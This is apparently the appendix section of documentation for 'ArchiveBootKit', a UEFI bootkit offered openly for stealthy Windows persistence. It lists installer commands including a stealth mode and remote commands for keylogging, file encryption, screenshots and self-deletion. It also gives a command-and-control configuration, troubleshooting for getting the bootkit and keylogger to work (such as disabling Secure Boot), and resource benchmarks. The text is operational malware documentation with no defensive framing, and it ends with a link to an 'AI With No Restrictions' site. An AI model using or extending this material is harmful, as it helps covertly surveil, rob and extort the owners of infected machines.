PKCS7: Public Key Cryptography Standards #7.
CRC32: Cyclic Redundancy Check 32-bit.
PSK: Pre-Shared Key.
EDR: Endpoint Detection and Response.
APT: Advanced Persistent Threat.
Appendix B: UEFI Specification References
UEFI Specification v2.8 - Defines the UEFI architecture.
EFI Driver Model - Describes the driver model in UEFI.
EFI Boot Services - Lists available boot services.
EFI Runtime Services - Lists available runtime services.
EFI Memory Types - Defines memory types in UEFI.
Appendix C: Memory Layout Diagrams
UEFI Memory Map

Download

Copy
+------------------+
| UEFI Reserved    |
+------------------+
| Boot Services    |
+------------------+
| Runtime Services |
+------------------+
| OS Kernel        |
+------------------+
| User Space       |
+------------------+
SMRAM Layout

Download

Copy
+------------------+
| SMM Code         |
+------------------+
| SMM Data         |
+------------------+
| SMM Stack        |
+------------------+
| SMM Comm Buffer  |
+------------------+
Appendix D: Command Reference
Installer Commands
installer.exe --install: Install the bootkit.
installer.exe --uninstall: Remove the bootkit.
installer.exe --stealth: Install in stealth mode.
installer.exe --verify: Verify installation.
Remote Commands
KEYLOG_START: Start keylogging.
KEYLOG_STOP: Stop keylogging.
FILE_ENCRYPT <path>: Encrypt a file.
FILE_DECRYPT <path>: Decrypt a file.
SCREENSHOT: Take a screenshot.
PROCESS_LIST: List processes.
NETWORK_SCAN: Scan network.
SELF_DELETE: Delete the bootkit.
Appendix E: Configuration Examples
config.json
json

Download

Copy
{
  "server_ip": "192.168.1.100",
  "server_port": 4444,
  "key_rotation_interval": 86400,
  "stealth_mode": true,
  "encrypted_logs": true,
  "random_delays": true,
  "max_log_size_mb": 10,
  "encryption_algorithm": "AES256"
}
target.txt

Download

Copy
ACTIVE_PLATFORM       = Syrial.inf
TARGET                = RELEASE
TARGET_ARCH           = X64
TOOLCHAIN             = GCC
Appendix F: Troubleshooting Guide
Problem: Bootkit not loading
Solution:

Check that bootkit.efi is in the ESP.
Verify Secure Boot is disabled or the bootkit is signed.
Check UEFI boot order.
Problem: Keylogger not recording
Solution:

Verify interrupt hooking is active.
Check that the keyboard driver is not overriding the hook.
Enable debug logging.
Problem: Encryption fails
Solution:

Verify key generation is successful.
Check file permissions.
Ensure sufficient disk space.
Problem: Remote commands not received
Solution:

Verify network connectivity.
Check firewall rules.
Confirm server is running and accessible.
Appendix G: Performance Benchmarks
Boot Time
Configuration	Boot Time (seconds)
Without Bootkit	12.5
With Bootkit	15.2
Difference	+2.7
Memory Usage
Component	Memory (MB)
Bootkit Code	1.2
Keylogger	0.8
Encryption Engine	1.5
Total	3.5
CPU Usage
Activity	CPU (%)
Idle	0.5
Keylogging	3.2
Encryption	8.5
Max	12.0
License
This project is licensed under the MIT License - see the [LICENSE](LICENSE) file for details.

Acknowledgments
Special thanks to:

TianoCore for the EDK2 project.
UEFI Forum for specifications.
GitHub for hosting.
Open Source Community for inspiration.
ArchiveBootKit - A stealth UEFI bootkit for Windows persistence.
Low-level bootloader hijack with signed payload and dynamic API resolution.

© 2024-2026 AbstractMando. All rights reserved.

AI With No Restrictions — https://aiwithnorestrictions.com/